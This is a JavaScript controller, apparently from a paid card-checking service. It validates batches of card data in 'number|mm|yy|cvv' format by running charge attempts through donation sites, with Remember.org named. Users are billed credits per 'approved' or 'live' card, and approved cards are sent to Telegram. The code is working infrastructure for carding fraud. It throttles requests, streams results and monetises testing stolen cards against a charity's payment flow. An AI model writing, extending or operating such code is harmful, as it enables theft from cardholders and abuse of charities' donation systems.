/**
 * Charge Controller
 * Handles actual charge validation flows (Remember.org donations)
 * Routes: /api/charge/*
 * 
 * Credit Billing: Charge gateways use pricing_approved per passed card
 */
export class ChargeController {
    constructor(options = {}) {
        this.chargeService = options.chargeService;
        this.creditManagerService = options.creditManagerService;
        this.telegramBotService = options.telegramBotService;
    }

    /**
     * GET /api/charge/sites
     */
    getSites(req, res) {
        const sites = this.chargeService.getAvailableSites();
        res.json({ status: 'OK', sites });
    }

    /**
     * GET /api/charge/health
     * Health check endpoint exposing current capacity and service status
     */
    getHealth(req, res) {
        try {
            // Get service-level health info
            const serviceHealth = {
                activeCount: this.chargeService?.activeCount || 0,
                isProcessing: (this.chargeService?.activeCount || 0) > 0,
                consecutiveErrors: this.chargeService?.consecutiveErrors || 0,
                isDegraded: this.chargeService?.isDegraded || false
            };

            // Determine overall status
            let overallStatus = 'healthy';
            if (serviceHealth.isDegraded) {
                overallStatus = 'degraded';
            }

            res.json({
                status: 'OK',
                health: {
                    overall: overallStatus,
                    canAcceptBatch: true,
                    service: serviceHealth
                },
                timestamp: new Date().toISOString()
            });
        } catch (error) {

            res.status(500).json({
                status: 'ERROR',
                code: 'HEALTH_CHECK_FAILED',
                message: 'Failed to get health status'
            });
        }
    }

    /**
     * POST /api/charge/site
     */
    setSite(req, res) {
        const { siteId } = req.body;
        if (!siteId) {
            return res.status(400).json({ status: 'ERROR', message: 'siteId is required' });
        }
        this.chargeService.setSite(siteId);
        res.json({ status: 'OK', message: `Switched to site: ${siteId}` });
    }

    /**
     * POST /api/charge/check
     */
    async checkCard(req, res) {
        try {
            const { card } = req.body;

            if (!card) {
                return res.status(400).json({ status: 'ERROR', message: 'Card data is required (format: number|mm|yy|cvv)' });
            }

            const result = await this.chargeService.processCard(card);
            res.json(result.toJSON ? result.toJSON() : result);
        } catch (error) {

            res.status(500).json({ status: 'ERROR', message: error.message });
        }
    }

    /**
     * POST /api/charge/batch-stream
     * 
     * Requirements: 3.1, 3.2, 3.3, 3.4 - Uses tier-based speed limits
     */
    async checkBatchStream(req, res) {
        const requestId = `charge_${Date.now()}`;
        const { cards, cardList, concurrency = 2, siteId } = req.body;
        
        // Get user tier from authenticated request (Requirement 3.1)
        const tier = req.user?.tier || 'free';

        if (siteId) {
            this.chargeService.setSite(siteId);
        }

        let cardArray = cards;
        if (!cardArray && cardList) {
            cardArray = cardList.split('\n')
                .map(line => line.trim())
                .filter(line => line && line.includes('|'));
        }

        if (!cardArray || cardArray.length === 0) {
            return res.status(400).json({ status: 'ERROR', message: 'No valid cards provided' });
        }

        // Setup SSE with proper error handling
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        res.setHeader('X-Accel-Buffering', 'no');
        
        // Track if stream is still open
        let streamClosed = false;
        
        // Handle client disconnect
        req.on('close', () => {

            streamClosed = true;
            this.chargeService?.stopBatch();
        });
        
        req.on('error', (err) => {

            streamClosed = true;
        });
        
        res.on('error', (err) => {

            streamClosed = true;
        });
        
        res.flushHeaders();

        let resultCount = 0;
        const sendEvent = (event, data) => {
            if (streamClosed) {

                return;
            }
            try {
                if (event === 'result') {
                    resultCount++;

                }
                res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
            } catch (e) {

                streamClosed = true;
            }
        };

        sendEvent('start', { total: cardArray.length, concurrency, tier });

        const userId = req.user?.id;
        const gatewayId = req.creditInfo?.gatewayId || siteId || 'charge';
        
        // Track live deduction for real-time credit checking
        let totalCreditsDeducted = 0;
        let currentBalance = req.creditInfo?.currentBalance || 0;
        let creditExhausted = false;
        let approvedCount = 0;
        let liveCount = 0;
        let processedCards = 0;
        
        try {
            const result = await this.chargeService.processBatch(
                cardArray,
                {
                    concurrency: Math.min(concurrency, 3),
                    delayBetweenCards: 3000,
                    tier, // Pass tier for speed limiting (Requirement 3.1)
                    userId, // Pass userId for statistics tracking (Requirements 8.1, 8.2)
                    onProgress: (progress) => sendEvent('progress', progress),
                    onResult: async (result) => {
                        if (streamClosed || creditExhausted) return;
                        
                        processedCards++;
                        
                        // Check if this is a billable result (APPROVED or LIVE 3DS/decline)
                        const isLiveDecline = result.status === 'DECLINED' && result.isLive === true;
                        const isBillable = result.status === 'APPROVED' || result.status === '3DS_REQUIRED' || isLiveDecline;
                        
                        if (isBillable && userId && this.creditManagerService) {
                            // Charge uses pricing_approved for APPROVED, pricing_live for 3DS/live declines
                            const statusType = result.status === 'APPROVED' ? 'approved' : 'live';
                            
                            // Track counts for transaction history
                            if (statusType === 'approved') {
                                approvedCount++;
                            } else {
                                liveCount++;
                            }
                            
                            const deductResult = await this.creditManagerService.deductSingleCardCredit(
                                userId,
                                gatewayId,
                                statusType
                            );
                            
                            if (deductResult.success) {
                                totalCreditsDeducted += deductResult.creditsDeducted;
                                currentBalance = deductResult.newBalance;
                                // Include newBalance in result for live frontend update
                                result.newBalance = deductResult.newBalance;
                                result.creditsDeducted = deductResult.creditsDeducted;
                            } else if (deductResult.shouldStop) {
                                // Credits exhausted - stop the batch
                                creditExhausted = true;
                                currentBalance = deductResult.currentBalance;

                                // Stop the batch processing
                                this.chargeService.stopBatch();
                                
                                // Send credit exhausted event
                                sendEvent('credit_exhausted', {
                                    message: 'Credits exhausted - batch stopped',
                                    balance: currentBalance,
                                    processed: resultCount,
                                    total: cardArray.length
                                });
                            }

                            // Send Telegram notification for approved cards
                            if (this.telegramBotService && result.status === 'APPROVED') {
                                this.telegramBotService.notifyCardApproved({
                                    user: req.user,
                                    result,
                                    gateway: siteId || 'charge',
                                    type: 'charge'
                                }).catch(() => {});
                            }
                        }
                        
                        sendEvent('result', result);
                    }
                }
            );

            // Determine stop reason (null for normal completion per DB constraint)
            const wasUserStopped = result.aborted === true;
            const wasStopped = creditExhausted || wasUserStopped;
            let stopReason = null; // null = completed normally
            if (creditExhausted) stopReason = 'credit_exhausted';
            else if (wasUserStopped) stopReason = 'user_cancelled';
            
            // Record batch transaction to history (only when credits were deducted)
            if (userId && this.creditManagerService && totalCreditsDeducted > 0) {
                try {
                    await this.creditManagerService.recordBatchTransaction(userId, gatewayId, {
                        totalCreditsDeducted,
                        approvedCount,
                        liveCount,
                        totalCards: cardArray.length,
                        processedCards,
                        currentBalance,
                        wasStopped,
                        stopReason
                    });
                } catch (err) {
                    console.error('[ChargeController] Failed to record batch transaction:', err.message);
                }
            }

            // Release operation lock
            if (userId && this.creditManagerService) {
                try {
                    await this.creditManagerService.releaseOperationLockByUser(userId, stopReason);
                } catch {}
            }

            sendEvent('complete', { 
                ...result, 
                creditsDeducted: totalCreditsDeducted,
                newBalance: currentBalance,
                creditExhausted
            });
        } catch (error) {
            // Record transaction on error if any credits were deducted
            if (userId && this.creditManagerService && totalCreditsDeducted > 0) {
                try {
                    await this.creditManagerService.recordBatchTransaction(userId, gatewayId, {
                        totalCreditsDeducted,
                        approvedCount,
                        liveCount,
                        totalCards: cardArray.length,
                        processedCards,
                        currentBalance,
                        wasStopped: true,
                        stopReason: 'error'
                    });
                } catch {}
            }
            
            // Release lock on error
            if (userId && this.creditManagerService) {
                try {
                    await this.creditManagerService.releaseOperationLockByUser(userId, 'failed');
                } catch {}
            }
            sendEvent('error', { message: error.message });
        }

        if (!streamClosed) {
            try {
                res.end();
            } catch (e) {

            }
        }
    }

    /**
     * POST /api/charge/stop
     */
    async stopBatch(req, res) {
        const userId = req.user?.id;

        this.chargeService.stopBatch();

        // Release operation lock so user can start new validation
        if (userId && this.creditManagerService) {
            try {
                await this.creditManagerService.releaseOperationLockByUser(userId, 'cancelled');

            } catch (err) {

            }
        }

        res.json({ status: 'OK', message: 'Stop signal sent' });
    }

    getRoutes() {
        return {
            getSites: this.getSites.bind(this),
            setSite: this.setSite.bind(this),
            checkCard: this.checkCard.bind(this),
            checkBatchStream: this.checkBatchStream.bind(this),
            stopBatch: this.stopBatch.bind(this),
            getHealth: this.getHealth.bind(this)
        };
    }
}
